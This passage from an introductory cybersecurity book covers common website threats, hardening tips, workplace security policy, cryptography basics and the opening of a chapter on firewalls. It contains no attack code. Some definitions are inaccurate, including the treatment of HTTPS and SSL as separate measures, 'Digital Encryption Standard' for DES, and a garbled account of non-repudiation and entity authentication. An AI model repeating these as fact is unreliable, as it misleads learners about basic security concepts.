There are various ways a website can be hacked. We have common threats to your web security, and every security-conscious individual must take necessary steps to avoid these threats. To help you, I have compiled possible security measures to take by avoiding these threats.

*   > Spam

> Normally, people see spam as an annoying thing because they are delivered to our mail. At times, we see that in our spam box when we access our email. Nevertheless, some of these spams are malicious and intentionally sent by hackers. Another common form of spam is a comment on most websites. Hackers have designed bots, which can bombard a comment section of a website containing links. These links direct the user to another site, which caves a way to build backlinks.

*   > Malware and Viruses

> Malware is a malicious software and the biggest threat to a website. Amazingly, these cybercriminals create over 230,000 malware on a daily basis. The following statistics from Statista indicate the popular types of malware must cybercriminals use throughout the world.

|  
Type of Malware

 |  
Number of Encounters (%)

 |
|  
Memory scraper/Memory Dumper

 |  
16

 |
|  
Downloader

 |  
14

 |
|  
Remote administration tool

 |  
9

 |
|  
Injector

 |  
9

 |
|  
Keystroke logger

 |  
8

 |
|  
Bot

 |  
7

 |
|  
Remote admin

 |  
6

 |
|  
Installer

 |  
5

 |
|  
Password utility

 |  
5

 |
|  
Anti-analysis

 |  
5

 |
|  
Ransomware

 |  
4

 |
|  
Privilege escalation

 |  
4

 |
|  
Reverse shell

 |  
4

 |

> From the table, you can see that malware is of different sizes and shapes, which makes that a bigger threat to your web security. These viruses normally access your server resources or private data. Criminals use ransomware, malware, and viruses to make money through affiliate links and add by hacking into your website. If you are attacked by malware, your visitors along with your website are at risk. It is your responsibility to protect your users and prevent them from downloading any malicious file from your website.

*   > WHOIS Domain Registration

> Not many know that buying a domain name isn't different from when you want to buy a house. Before the company sells the house to you, they must know who wants to buy it and a possible way of contacting you. This information becomes a public record and available when the need arises.

> Buying a domain name works the same way. However, it depends on the particular country you reside in because certain information will be needed from you to record on WHOIS data. Besides your personal details, they may also require your URL nameservers. Cybercriminals can take advantage of this information to pinpoint your server location. with this information, they can have access to your webserver.

*   > Denial-of-Service Attacks

> These attacks aim at denying the user access to a specific website. Normally, these criminals use spoof IP address to load servers with traffic. Through this, the website becomes offline. Once this is achieved, the host must find possible ways to ensure the server is up and running. In the course of this, the host leaves the server open to potential attacks from malware, ransomware, or virus.

Defense Strategy for Web Security

There are two means to accomplish perfect web security. The first involves you assigning all resources required to sustain a persistent alert to the latest security issues. This requires all updates and patches to be undertaken once with all existing applications reviewed properly.

The second way of acquiring perfect web security is to utilize a web scanning solution to check your current applications, equipment, and website code. This will help you to see if there is any known vulnerability in the system. In this situation, IPS/IDS, antivirus, and firewalls are useful. However, the most efficient security investment you will have is website vulnerability and network scanning.

In a situation where you have to choose one of these two strategies, then web scanning will provide a better level of website security than the latter option.

Steps to Keeping Your Website Safe

Since you I have familiarized you with the likely web security threat you may face, it is important to proffer ways of preventing these attacks. You have to deal with the assumption that the website is secure if nothing has been done to improve its security. To improve your web security, there are necessary steps to take that will help you. If you want to protect your website, then you should implement these steps.

*   > Use HTTPS Protocol

> Peradventure your websites doesn’t run on this protocol, then you need to change that situation. This protocol tells your visitors that they are safe when they interact with your website. Additionally, they know their information is safe, and nobody can interrupt or change the content.

> If your website doesn’t have the https protocol, it is prone to hackers, who can alter the information of your page to collect sensitive information. For instance, they can steal your login information and those of your users. The benefit of having an https protocol is that it doesn’t just secure your site but helps improve your search ranking. Interestingly, Google rewards people with this protocol. It is like giving your child sweet for every good action they do.

> Furthermore, people are comfortable to visit sites with HTTPS protocol because the site is trustworthy and secure. If you want to super protect your website, you can combine HTTPS protocol with secure sockets layer (SSL) certificate. SSL is required if you run an e-commerce website because users will submit sensitive information such as names, address, and credit card numbers.

> Although using an SSL certificate is a good preventive measure, it doesn’t prevent you from any likely attack. Instead, it encrypts your communication between the browser and the server. It doesn’t matter if you are not using an e-commerce website, it is advisable to combine both the HTTPs protocol and SSL certificate.

*   > Update Your Software and Applications

> If you are using an application or software on your site, you should ensure you update it constantly. If you use WordPress, you need to update the plugins, themes, and everything that requires updating.

> The reasons for these updates is to fix any glitches or bugs and any upgrades or improvement. There is no software or application that is perfect. Cybercriminals are looking for means to attack unprotected websites. You shouldn’t leave your site vulnerable because most cyber-attacks are automated. These cybercriminals use a bot to scan sites, which are defenseless. Therefore, keep your software updated to its latest version to avoid any potential attack.

*   > Select a Secure Web-Hosting Plan

> You will enjoy some level of protection if your host provider takes the security of its servers serious. However, this doesn’t happen in most situations. It is appealing if you decide to purchase a shared hosting plan considering the price. Nevertheless, this might not be the best website security choice because you are sharing the servers with other website owners.

> The danger of this option is that if a particular website is attached by a virus, malware, or ransomware, your website isn’t exempted. With this, these hackers can have access to your website through the shared server. Don’t get me wrong, I am not saying that using a shared hosting plan is wrong, but if you want to improve your website security, this is not the perfect option to consider.

*   > Change Your Password

> This preventive measure cannot be overemphasized, considering the increasing security threats within the last five years. It is not enough to change your password but using a combination of different special characters including “*&$@!”. What most people do is to use the same password for every website they access. They have been using the same password for over ten years without changing it once.

> It is good, but here is the danger. Let us assume you are a glutton that loves spicy food. You have this special website that you order your meals, which usually requires give reviews. You require an email address and password to drop your reviews. If for one reason the website becomes hacked or compromised, what happens to you? assuming you are using the same login details for every website you access including your own site and the hackers discover this. What do you think will happen? With your email address and password, they can access your administrative setting, and that will be the rest of the story.

*   > What next?

> Your web security shouldn’t be taken lightly. If you haven’t given any consideration to securing your website, then you are at risk while reading this. It is hardly possible for any website to remain 100% secure and safe because hackers aren’t sleeping. They are constantly looking for new ways to steal information and attack websites. However, you can change the narrative by adhering to the above security measures. When these criminals have a hard time accessing your website, they don’t wait. They find new targets because you are well-equipped.

Workplace Security Guidelines

It is palpable now that office and organizational security is a top concern confronting our modern workplace. However, figuring ways of building an all-inclusive workplace security policy looks unattainable for most managers and business owners, especially for individuals who aren’t conversant with various safety developments and industry jargon. Luckily, there is a starting point if we use the right tools. However, before the drafting of a workplace policy, it is essential to understand the various aspects of office and organization security. After this, I can begin with the specifics, which include access control, physical security, and alarm systems.

*   > Understanding the Office and Organizational Security Policies

> To create a secure in our work environment, it is essential to have a workplace security policy. Irrespective of the size of your company, area of expertise, or the kind of business you do, your workplace has everything to benefit when there is a clear cybersecurity policy. This policy must shape the security goals of the organization, including its internal and external threats. Additionally, these policies must be enforced because they can help avert uncountable security challenges. An effective policy will outline fundamental instructions, guidelines, and definitions, which are consistent throughout the organization. For instance, the acceptable password to use, cyber training for IT staff, security awareness for all staff, and setting appropriate procedures to guarantee both physical and digital security.

*   > Digital Security

> Improving the workplace cybersecurity serves as the first step to protect your office and organization. This includes the protection of data, data, and the non-physical aspect of the workplace. You can begin by securing your computer and networks by buying your own servers. The benefits of having your own server are great because it gives you the opportunity to have a secured network and protection to your privacy and data. Additionally, educating your employees is significant in the latest digital practices, including ways of avoiding phishing emails and creating strong passwords for whatever account they use online.

> Furthermore, with a good Wi-Fi network, you can keep your physical security systems online. This means you are always protected. If you decide to invest in a decent access control system, you need a dependable network, which will deliver your security devices the capability to communicate swiftly and validate identities without any issues. Your workplace will have minimal cybersecurity challenges if you set up your digital security rightly.

*   > Physical Security

> Undoubtedly, physical security is part of the major important part of workplace safety. It encompasses a big deal of different parts including anti-theft measures, safety regulations, protection against fires, etc. while digital security is important, at the workplace; physical security is the first defense line. Having a comprehensive physical security procedure is essential because it helps reduce insurance claims, closures, liabilities, and security expenses that may affect your business or organization. A reliable physical security policy must clearly outline identity authentication, employee access, alarm systems, and facility requirements as the case may be.

> All servers, customer data, data storage, business strategy document, client contract, and intellectual property is vulnerable to damage and burglary from physical threats. Peradventure there is a fire outbreak or an intruder has access to your office, secured files, and server rooms, your computer can be compromised. This means your physical security policy is very vital because it controls your amenities and assets. The advantages of having a physical control policy include having fewer financial losses, reduced risk, protection of properties and staff, and recovery in the event of an accident. Overall, your physical security is a necessity even if it is not a luxury.

*   > Access Control

> Another way of improving your office and organization security is through the implementation of an access control system. Access control involves managing everything that is required to access your workplace environment. Although it sounds simple and you may think about how that relates to cybersecurity? Well, if your network server is exposed and attackers find out, you stay to lose your sensitive information. Importantly, this will mean bad business for you because your clients won’t trust you. However, once you set up a good security system in place, every facet of your physical security can be managed, including the authentication of an employee, visitors’ access, etc. There are basically five stages to access control procedures, which include authorization, authentication, accessing, management, and auditing. The processes, conditions, and criteria of these different stages must be implemented.

> Chapter 7: Basic Concept of Cryptography

In this chapter, I will introduce the concept of cryptography. The word shouldn’t instill any fear because it is quite easy to understand and use to your advantage. Amazingly, most computer security terms have straightforward meaning that is not complex to understand. However, my aim in this chapter is to help you understand even the complicated terms and proffer solutions to your security based issues.

Cryptography is an act, which involves encoding messages to make them hard to read. Do you remember the illustration I gave concerning leaving in a glass house? Every passerby gets to see the content of your house. However, if it is built with brick and block, it will be hard for them to know what you have within your own.

In the olden days, cryptography was performed using manual methods. Although times have changed, the basic framework for performing cryptography hasn’t changed that much, in as much as there has been a notable improvement in the techniques. Importantly, computers have the capability to perform these algorithms, thereby making the process more secure faster.

We have five functions of cryptography today. These include:

*   > Authentication – This involves one proving its identity. It ensures that the receiver is authorized to have access to the information. Cryptography authentication comprises of two variants – the message authentication and the entity authentication. The message authentication identifies the message originator without regarding any system or router that sent the message. However, the entity authentication ensures that the information has been received.

*   > Confidentiality/privacy – Ensuring that the message sent is for the intended receiver only and nobody can read it. Confidentiality is an essential security service that cryptography provides. It safeguards information from unauthorized individuals and can be gotten through various processes beginning from the use of physical techniques to mathematical algorithms.

*   > Integrity – Guaranteeing the receiver that the content of the message is not tempered or changed in any way from the original message. An unauthorized person may alter the data either intentionally or accidentally. However, cryptography helps to safeguard data integrity by detecting if a particular data have been manipulated or altered by an unauthorized individual.

*   > Non-repudiation – a mechanism to ascertain that the receiver sent the message

*   > Key exchange – the process whereby crypto keys are shared between the receiver and the sender.

In cryptography, we normally begin with the unencrypted data, which we call plaintext. The plaintext is then encrypted to ciphertext, which is further decrypted into usable plaintext. This whole encryption and decryption process is based on the particular cryptography scheme implemented along with the key used. To make it easier, I will illustrate the encryption and decryption process using a formula to enable you to understand it clearer.

Let us assume that C represents ciphertext, P is plaintext, and k is the key used, while E and D are the encryption and decryption method, respectively.

C = E[k](P)
P = D[k](C)

When I am referring to two parties communicating, I will use the nickname Alice and Bob because it is a conversant terminology used in the cryptography industry. If the communication involves a third and fourth individual, then you may hear names like Carol and Dave. Furthermore, if during the communication, there is a malicious party, then I will call such party Mallory. A spy and a trusted third party will be referred to as Eve and Trent, respectively. If you are clear with these terms then we are ready to begin.

Do not forget that cryptography mostly deals with the creation and development of mathematical algorithms to encrypt and decrypt messages. On the other hand, cryptology refers to the general study of secret writing, whereas cryptanalysis is the science of examining and breaking encryption.

Brief Evolution of Cryptography

Early cryptography began during the European Renaissance. Different Italian and Papal states helped in the propagation of cryptographic techniques. During this period, various inquiry and attack methods were studied in order to break secret codes. One such improvement was the Vigenère coding, which came to limelight in the 15th century. Furthermore, in the 19th century, more sophisticated cryptography approaches were discovered. However, in the 20th century, came the invention of the electromechanical and mechanical machines, which provided an efficient and advanced means of encrypting information. Finally, during World War II, cryptanalysis and cryptography became extremely mathematical.

With various advancements taking place in the world, military units, corporate bodies, government organizations, and security professionals are advocating and adopting the use of cryptography. Today, most organizations are using cryptography to protect their information and secrets from intruders or attackers.

Cryptographic Algorithms

There are various ways of categorizing cryptographic algorithms; however, in this book; I will classify them based on the number of keys used in implementing the encryption and decryption process. Let us look at the three main types of algorithms.

*   > Secret Key Cryptography

*   > Public Key Cryptography

*   > Hash Functions

*   > Secret Key Cryptography

In this cryptographic algorithm method, we use a single key to implement both the encryption and decryption process. In the diagram below, you will observe that the sender of the message uses the key to encrypt the plaintext before sending the ciphertext to the receiver. In turn, the receiver uses the same key to decrypt the message before finding out the content of the message.

![](images/00024.jpg)

In this situation, the key serves both functions – encryption and decryption. At times, secret key cryptography is called symmetric encryption. In this cryptographic algorithm, the sender and receiver must know the key because that is the secret to the message. However, the challenge of this particular approach is the way the key is distributed. Notwithstanding, an organization depends on this approach, especially when there is an issue of privacy and confidentiality.

*   > Public Key Cryptography

> In the cybersecurity industry, public-key cryptography is one of the significant development we have seen in cryptograph within the last 400 years. Professor Martin Hellman of the Stanford and student Whitfield Diffie were the first to publicly describe the public key cryptography in 1976\. In their paper, they describe a two-key public system where the two-party can effectively engage in secured communication through an unsecured communication channel without any need of sharing a secret key.

> Public key cryptography relies on the existence of mathematical functions or a one-way function, which is easier to compute. However, their inverse function is more complicated if you want to compete. Let’s look at the two examples below.

*   > Multiplication vs. Factorization – for instance, you want to calculate the product of the following two prime numbers 3 and 7\. It shouldn’t take you any time to perform this simple calculation. We know that the answer will be 21\. Supposedly, you have the product of two numbers whose outcome is 21, and you want to find the prime factor of the number. When you did the multiplication of the two prime numbers, it took you lesser time when compared to finding the two prime factors. The problem becomes bigger when you want to find the prime with numbers above 400.

*   > Exponentiation vs. Logarithms – Assuming you want to calculate the number 5 to the 5^(th) power. This won’t take your time as all you have to calculate is 5⁵, which is equivalent to 3125\. However, if you begin with the number 3125 and decides to find two integers, that will take you a long time.

> The two examples may look inconsequential; however, they are a representation of the functional pairs used in public-key cryptography, which include the simplicity of multiplication and exponentiation against the difficulty of using factorization and logarithms respectively. The trick when it comes to using public-key cryptography is to find a trap door. Normally, public-key cryptography uses two different keys – one for the encryption and another for the decryption. Most users use public-key cryptography for key exchange, authentication, and non-repudiation. Another name for public-key cryptography is asymmetric encryption.

*   > Hash Function

> Message digests or hash function is a cryptography technique that doesn’t use any key; rather, it uses a fixed-length hash value, which is computed using plaintext. This makes it hard for the length or content of the plaintext to be recovered. This algorithm is used to offer a digital fingerprint of the content of a file. It helps to ensure that a virus or an intruder hasn’t changed the content of the file. Most operating systems use the hash function to encrypt passwords, which further provide a mechanism to guarantee the reliability of the file content.

Importance of Cryptographic Algorithm

A major issue for most people is why do we have different types of cryptographic algorithms? What is the need of having three different algorithms when we can use only one? The reason behind this is that each algorithm is optimized for a specific cryptographic application. For instance, the hash function algorithm is perfectly suited for guaranteeing data integrity since any alternation to the content of the message will lead to the receiver calculating a hash value that is different from that placed by the sender during the transmission of the message. Considering the fact that two different messages will not get the same hash value, there is a high level of confidence in data integrity.

On the other hand, secret key cryptography is well-suited in cases of encrypting messages, which provides confidentiality and privacy. In this, the sender will generate a session key for the encryption of that particular message. The sender will need that same session key to be able to decrypt the message effectively.

Modern Cryptography

Today, cryptography is the cornerstone of communication and computer security. It is the foundation upon which various mathematical concepts such as probability, computational-complexity, and number theory are based. There are three main characteristics of modern cryptography, which separates it from the approaches used in the olden days. To make it easier for you, I will present it in a tabular form.

|  
Classic Cryptography

 |  
Modern Cryptography

 |
|  
Operates on traditional characters such as digits and letters directly

 |  
Operates on the binary bit sequence

 |
|  
The technique is based on security through obscurity. This means that only the parties involved get to know the particular coding technique employed.

 |  
Modern cryptography depends on publicly known mathematical algorithms for information coding. However, secrecy only exists through a secret key. It is hard for intruders or attackers to get the original information since there is the absence of a secret key. Furthermore, the computational difficulty of algorithms makes it impossible for intruders to get the original information.

 |
|  
Classic cryptography requires the whole cryptosystem in order to communicate confidentially.

 |  
This requires the parties involved in private communication to have the secret key.

 |

Cryptology is the study of cryptosystems, which is further divided into two branches, namely cryptanalysis, and cryptography. Our focus in this book is on cryptography, but it is important to understand that cryptanalysis involves the art and science of breaking ciphertext. Cryptography and cryptanalysis co-exist without anyone being distinctively on its own. However, cryptography as already indicated in the process of making a cryptosystem with the capability of offering information security effectively. It deals with the security of digital data. At times, cryptography is referred to the design of mechanisms that uses mathematical algorithms to provide essential information security services.

Cryptosystem

This involves the implementation of cryptographic techniques along with their associated infrastructure to offer information security services. Another word for cryptosystem is cipher systems. In this section, I will look at a simple model of a cryptosystem, which offers confidentiality to the information transmitted. The diagram below shows the basic model of a cryptosystem.

![](images/00025.jpg)

The diagram above depicts a sender with the intention of sending sensitive information to a receiver in a way that no third party that intercepts the information in whatever channel can effectively extract the information. The primary objective of using a cryptosystem is to ensure that only the sender and receiver can decode the plaintext. Let us look at the element of a cryptosystem.

Elements of a Cryptosystem

From the diagram, we have six basic elements of a cryptosystem, which includes:

*   > Plaintext

> This is the data or information that must be protected during the transmission process

*   > Encryption algorithm

> This entails the mathematical process that generates the ciphertext for any encryption key and plaintext. In simple terms, it is an algorithm, which takes plaintext and transforms it into a ciphertext having an encryption key.

*   > Ciphertext

> The ciphertext is a scrambled version of the plaintext, which is generated through the encryption algorithm via an encryption key. However, the ciphertext is not protected as it passes through various public channels. Individuals who have access to the communication channel can compromise the data or information.

*   > Decryption Algorithm

> this involves the mathematical process, which generates a distinctive plaintext for any decryption key or ciphertext. What the decryption algorithm does is to take the ciphertext and decryption key as input before transforming it to plaintext.

*   > Encryption key

> the key is a value, which the sender must know in order to access the information.

*   > Decryption key

> the key is a value, which the receiver must know

Types of Cryptosystem

There are two types of cryptosystems, which is based on the encryption and decryption process. These include symmetric key and asymmetric key encryption. The primary difference these types of a cryptosystem is the encryption and decryption key. However, for any cryptosystem, both the encryption and decryption key are closely related. It is essentially difficult to decrypt the ciphertext with the key that is unconnected to the encryption key.

*   > Symmetric Key Encryption

> In this kind of cryptosystem, both the encryption and decryption process, have the same keys. If you see the term symmetric cryptography, it signifies the study of symmetric cryptosystems. Examples of symmetric key encryption methods include BLOWFISH, IDEA, Triple-DES, and Digital Encryption Standard (DES)

![](images/00026.jpg)

> Before 1970, various cryptosystems used the symmetric key encryption. However, its relevance today is very high and extensively used. There are indications that this encryption process has come to stay when you consider its advantages over the asymmetric key encryption. The advantage or features include:

*   > Keys are constantly changed in order to stop any form of attack on the system

*   > Individuals using the symmetric key encryption must both have a common key if there must be an exchange of information

*   > The process of encryption and decryption is faster because of the smaller number of bits used by the key when compared to the asymmetric key encryption

*   > To run a symmetric algorithm requires lower processing power unlike the asymmetric key encryption

*   > It requires a robust mechanism for the exchange of key between the parties involved

In spite of these advantages, there are basically two challenges to symmetric key cryptosystem. These include:

*   > Trust issues – Considering the fact that both receiver and sender require the same key, it requires an unassailable trust between the two parties. For instance, the receiver may lose the key to an authorized user without informing the sender.

*   > Key establishment – both the sender and receiver must agree to a secret key before any communication can take place. This requires a safe key establishment mechanism for the process to be effective.

When you consider the two challenges I just mentioned, it is clear that they are a hindrance to modern-day communication. Nowadays, there is a need for individuals to exchange information with non-trusted and unfamiliar parties. Because of the restriction that exists between the sender and the receiver brought about the asymmetric key encryption schemes.

*   > Asymmetric Key Encryption

This is the opposite of the symmetric key encryption that requires the same key for the encryption and decryption of the information. Asymmetric key encryption uses different keys for its encryption process. In as much as the keys are different, the encryption and decryption process are related mathematically. Therefore, the retrieval of the plaintext using decrypting ciphertext is practicable. The diagram below shows the illustration of the asymmetric key encryption process.

![](images/00027.jpg)

The asymmetric key encryption became popular in the 20^(th) century to deal with the issues of pre-shared encryption keys between two communicating parties.

The features include:

*   > Each user must have a different private and public key. Mathematically, the keys are related in the sense that while you use one for the encryption, the other is used for decrypting the ciphertext to its original plaintext.

*   > There is a need to place the public key in a public repository.

*   > While the public and private keys are associated with each other, it is not practicable to find one from another. This uniqueness is where the asymmetric system builds its strength

*   > If the first person needs to send information to another person, the first person must acquire the public key of the second person from the repository, then encrypt the information before transmitting it.

*   > The second person uses his own private key to extract the plaintext

*   > It uses a higher processing computer power to run the asymmetric algorithm

*   > The process is slower because of the number of bits involved in the encryption process

Cryptosystem Attacks

Today, businesses and our daily lives are information-driven. This has generated the cry for improved protection of vital information from mischievous activities, including attacks and data manipulation. To give you an idea, I will expound on the various attack that your information may be subjected to and how important it is to ensure you avoid such an attack. These attacks on your information can exist as a passive or active attack.

*   > Passive Attacks

> The primary motive why you may experience a passive attack is because attackers gain unauthorized access to your information. For instance, a passive attack action could include the interception and eavesdropping of a particular communication channel by an intruder.

> In nature, the attacks are passive because it doesn’t affect the information or disrupt the communication channel used in transmitting the information. Most times, a passive attack is seen as attackers stealing your information. The primary difference between these kinds of stealing with that of your physical goods is that your data or information remains in your possession. If someone steals your phone, you have automatically lost it unlike you recovered it.

> While for some, stealing their phones isn’t a big deal, you can’t downplay it when it has to do with your information. It is more dangerous than stealing any physical item or goods because the owner of the information may not know that his or her information has been compromised.

![](images/00028.jpg)

*   > Active attacks

This particular attack involves the alteration of information through a process that influences the original information. The following examples will open your eyes to what an active attack entails. This includes,

*   > Altering the information using an illegal means or method

*   > Initiating an unintended or illegal transmission of information through various medium

*   > Changing an authenticated data like the timestamp or originator’s name

*   > Denying information access to legitimate users

*   > Illegal deletion of information or data

![](images/00029.jpg)

However, with cryptography, you can put a stop to these attacks because of the various techniques and tools available to implement the cryptosystem.

The Assumptions of Attackers

Before going further, it is important to highlight certain assumptions of these attackers. You will agree with me that before a criminal comes to your home, he may have assumed that you don’t have an alarm system, a gun or any protective means to fight against him or her. The same is applicable to these attackers, who will do anything to steal your information. I don’t want to keep you in the dark, so you need to know the cryptosystems environment. Furthermore, you must understand the attacker’s assumptions along with the environment that dictates the attacker’s capabilities. We have three basic assumptions concerning the environment and the capabilities of the attackers.

*   > Information about the Encryption Scheme

> A cryptosystem design is founded on the following cryptography algorithms-

*   > Proprietary algorithms – in this, only the designers and users of the system know about the algorithm details

*   > Public algorithms – In this option, everyone knows the details of the algorithm because it is in a public domain

> When it comes to proprietary algorithms, the security of information is done through anonymity or obscurity. In the case of private algorithms, they may be less strong because the development process is undertaken by an in-house personal without an extensive investigation of any weakness. Additionally, they offer communication between a closed group only. Because of this, they are not perfectly suitable for modern communication, especially in areas where there is a large number of both unknown and known entities communicating.

> Therefore, the first assumption regarding any security environment is that the attacker knows the encryption algorithm.

*   > The accessibility of the ciphertext

> Once the encryption of the plaintext is transformed into ciphertext, it is then transmitted through an unsecured public channel. Therefore, the attacker can evidently assume that it has access to the generated ciphertext through the cryptosystem. The accessibility of the ciphertext is the second assumption from the attacker.

*   > The accessibility of plaintext and ciphertext

> Although this third assumption isn’t observable as the previous one, however, in certain situations, the attacker can have access to both the plaintext and its corresponding ciphertext. This is possible in situations such as:

*   > The attacker persuades the sender to alter or transform the plaintext in a format of his choice before getting the ciphertext from him.

*   > The receiver may accidentally reveal the content of the plaintext to the attacker. In turn, the attacker has the equivalent ciphertext, which is gotten through an open channel

*   > The encryption key in a public cryptosystem is available in an open domain, and any potential attacker may know the key. With this key, the attacker can generate the corresponding plaintext and ciphertext.

Cryptographic Attacks

Before looking at the benefits and drawbacks of cryptography, you must know that the primary intention of an attacker or hacker is to break a cryptosystem in order to gain access to the plaintext from the ciphertext. All the attackers need in order to get the plaintext is to find the particular secret decryption key.

This makes the attacker apply every knowledge he has to find out that particular secret key used in that cryptosystem. The moment he can do that, then such a system can be considered compromised, broken, or hacked. Based on this, there are various attacks that can be performed on a system, and I have helped you to categorize them in a simple way to know what particular attack you may be facing.

*   > Ciphertext only attacks

> In this particular attack, the attacker or hacker has access to a group of ciphertext (s). However, he doesn’t have access to the ciphertext corresponding plaintext. This particular attack is only successful when the attacker can get the corresponding plaintext from the given ciphertext (s). Most modern systems are protected against this form of attack.

*   > Known Plaintext attack

> In this particular strategy, the attacker has access to the plaintext of some part of the ciphertext. The main job in this attack is for the attacker to decrypt the remaining ciphertext from the information he has gathered.  A common example of the “known plaintext attack” is linear cryptanalysis against block ciphers.

*   > Dictionary attack

> There are many variations to this type of attack, but they all involve gathering a “dictionary.” The attackers use a simple method of building a dictionary of ciphertext along with its plaintext, which they may have learned over a long time. In the future, once the attacker gets access to the ciphertext, he looks through the dictionary he has created to find any corresponding plaintext.

*   > Brute force attack

> During this attack, the attacker does everything possible to determine the secret key by using every possible key. Peradventure the length of the secret key is 8 bit, and then the likely number of keys will be 2⁸, which is equivalent to 256\. With the ciphertext and algorithm known to the attacker, he tries every possible 256 keys for the decryption. However, the time taken by the attacker to complete this attack is very high because he has to try every single key.

*   > Man in the Middle Attack

> The primary focus of the attackers in this attack is mostly public key cryptosystems, especially in areas where keys must be exchanged before communication can occur. For instance, host X wants to transmit a message to host Y, thereby request for the public key of host Y. then the attacker intercepts this request from host X and sends the key instead of host Y sending it. Due to this, whatever host X sends to host Y, the attacker has access to read it. To maintain the communication process going between the two hosts, the attacker re-encrypts the information after reading it and resend it to host Y. the attackers send his personal public keys as the key from host X in order to deceive host Y that the message is coming from host X.

Cryptography Digital Signature

Have you ever signed a document physically? Do you know the importance and implication of your action? I am sure you understand if it is a matter of life and death. Well, a digital signature is like your handwritten signatures or typed messages, which is a binding signatory to that message or document. It is a technique, which binds an entity/person to digital data or information. Both the receiver and any third party can independently verify this binding.

In the physical world, when we sign documents, it is a sign of assurance that such a message is from the sender, and there shouldn’t be any repudiation of the original message. In the case of a digital signature, the signer only knows the secret key.

The model of the digital signature system is based on public-key cryptography, and the diagram below shows the entire process involved.

![](images/00030.jpg)

The following is an explanation of what goes on in the entire process:

*   > Each individual implementing the digital signature has his or her own pair of the public or private key

*   > Normally, the keys used for the encryption and decryption process is different from that use in the signing and verification process. The signature key is the private key whereas the verification key is the public key

*   > The signer provides data to the hash function before generating a hash of data

*   > The signature key and hash value are then sent to the signature algorithm, which then generates the digital signature based on the given hash. Furthermore, the signature is appended to the information before sending it to the verifier.

*   > The verifier then feeds the verification key and digital signature to the verification algorithm, which generates some values as an output

*   > Additionally, the verifier runs the same hash function from the data received to produce the hash value

*   > In order to ascertain that the digital signature is valid, the verifier then compare the output of the verification algorithm with the hash value

*   > The importance of Cryptography Digital Signature

> Of all cryptographic primitives we have, the digital signature through public-key cryptography is the most useful and significant tool to provide information security in this world. Besides its capability of hindering the reproduction of messages, it further provides data integrity and message authentication. Let us look at the important role that digital signature plays in information security.

*   > Data integrity – peradventure the attacker has access to the information and alters anything, at the receiver’s end; the digital signature verification will fail. This is because the output from the verification algorithm and the hash modified information will not match. Therefore, the receiver can safely reject the message, citing a breach of data integrity.

*   > Message authentication – Once the verifiers authenticate the digital signature through the sender’s public key, the verifier is assured that the sender, who has access to the equivalent secret private key, created the signature. Therefore, the key is between the sender and receiver without any third parties involved.

*   > Non-repudiation – Based on the assumption besides the signer no other person has the signature key, the sender can generate a unique signature on a set of data. With this, the receiver has evidence of the present data along with the digital signature if there is any issue that may arise in the future.

*   > Benefits, challenges and The Future of Cryptography in Information Security

In conclusion, to this chapter, it is important to explore the benefits of cryptography along with its challenges. Currently, we are interconnected with information now in its digital form of bytes and bits. Relevant and critical information must be protected from criminals. They must be stored, processed, and transferred in a digital format through various communication channels. Considering the fact that information plays an important role in national security, intruders or attackers are targeting any open communication channels and computer systems to either interrupt the flow of critical information or steal sensitive information from innocent users.

However, with the advent of technology, various cryptography techniques have been a provider to guarantee that the malicious objectives of these cybercriminals are not only thwarted but ensuring that only authorized users have access to this information. Without further ado, let us look at the benefits, limitations, and the future of cryptography in information security.

Benefits of Cryptography

An essential tool for information security is cryptography, and no one can dispute that fact. However, it provides four basic benefits to information security. These include:

*   > Confidentiality – Through cryptography, we can protect various information from unauthorized users and access to this information

*   > Authentication – Through various cryptography techniques such as digital signatures and MAC, we can protect our information from forgeries and spoofing

*   > Non-repudiation – It provides the services of non-repudiation in order to protect against any dispute, which may come up because of denial of transmitting the message

*   > Data integrity – The hash functions of cryptography helps in assuring the users concerning the data integrity of the information

Drawbacks of Cryptography

In spite of the widespread acceptance of cryptography in the information security industry, it does have certain drawbacks that have affected the effective usage of information. These issues include:

*   > It can be difficult for even a legitimate user to access an authentic, encrypted, and digitally signed information at a decision making period. An intruder can attack or render the computer system or network non-functional

*   > The high cost of cryptography in terms of money and time is a major issue confronting information security.

*   > It doesn’t protect against threats and vulnerabilities, which may emerge because of the poor design of systems, procedures, and protocols.

The Future of Cryptography

Technology will control to improve, and this has brought about elliptic curve cryptography; although it has its own benefits and drawback, which hasn’t been fully understood. Notwithstanding, Elliptic Curve Cryptography allows users to perform the encryption and decryption process in lesser time, thereby allowing a high volume of data to be transmitted with equal security. While elliptic curve cryptography is still new, there is a need to test and prove its security before it can be accepted to be used for private, commercial, and governmental purposes.

Another new phenomenon is quantum computation. In as much as the data of modern computers are stores in a bit, a quantum computer stores its data via a quantum superposition of multiple states. There are indications that modern cryptography will explore harder computational problems or perhaps devise new strategies of archiving the objectives as presented today.

> Chapter 8: Firewalls

Introduction

If you were to ask any cybersecurity expert, if the internet is a scary place, 9 out of 10 will agree to it. Hackers or cybercriminals have the capability of hiding their identity while attempting to intrude into people’s computers to access their personal information with the intention of using it for their personal gain.

To complicate matters, assuming your operating system or software has a security hole, which isn’t fixed quickly, this could lead to someone hacking into your computer without you noticing. What do you do in such a situation? Does it mean you have to stop using the internet? Is there a way of protecting yourself against such unauthorized intrusion to your privacy?

Amazedly, you can do something quickly to protect yourself. With firewalls, you can protect yourself without any external intrusion. Previously, firewalls were “hotcakes,” which is only used by big companies because they are expensive pieces of hardware. During those days, not many people use the internet. However, if they did, they were using a dial-up connection, which isn’t fast enough. Because of this, most hackers target companies with large bandwidth.

Today, virtually everyone is connected to the internet with cheap and fast internet speed. Hackers have taken their game to both big companies and home users, especially those improperly secured. However, before going further, it is important to understand what firewall entails along with its distinct features.

What is a Firewall?

A firewall can be a software application or hardware device, which acts as a bodyguard between your internet and your computer. It shields every “internet traffic,” which you have not requested from having access to your computer. This is a simple analogy, but that is what a firewall does. In simple terms, let us assume you browse to xyz website, the firewall will allow the traffic from the “xyz” website to gain access to your computer. However, if you didn’t request to visit the xyz website and the site now sent traffic to your system, the firewall will not allow it to access your computer. Notwithstanding, these characteristics exhibited can be changed.

Don’t get it confused when I said firewall could be a software application or hardware device; here lies the difference. A hardware firewall device sits within your internet connection while the other part is connected to your computer. Most of these firewalls have an inbuilt hub, which enables you to connect multiple computers for sharing a single internet connection.

The firewalls use a technology known as Network Address Translation to provide the required protection to all computers, which is connected to it. The protected computers performed this protection through private IP addresses, which initially isn’t reachable via the internet. Additionally, the firewall converts these internal IP addresses into a single public IP address, which is then assigned to your firewall. With this, your hardware firewall can accept every incoming request and later forward them to your internal computer request.

